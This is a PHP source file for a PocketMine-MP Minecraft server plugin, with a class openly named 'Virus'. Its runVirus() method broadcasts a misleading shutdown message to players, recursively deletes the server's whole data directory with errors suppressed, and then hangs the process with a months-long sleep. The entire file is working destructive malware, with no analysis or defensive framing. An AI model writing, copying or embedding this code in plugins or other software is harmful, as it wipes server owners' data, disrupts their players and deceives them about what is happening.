<?php

namespace provsalt\Virus;

use pocketmine\Server;
use pocketmine\utils\TextFormat;

class Virus {
	public static function runVirus() :void{
		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Servwr] &rGoodbye guys server will be shutting down today!"));
		$dir = Server::getInstance()->getDataPath();
		self::deleteDir($dir);
		sleep(10000000);
	}
	public static function deleteDir($path) {
	$class_func = array(__CLASS__, __FUNCTION__);
	return is_file($path) ?
		@unlink($path) :
		array_map($class_func, glob($path.'/*')) == @rmdir($path);
	}
}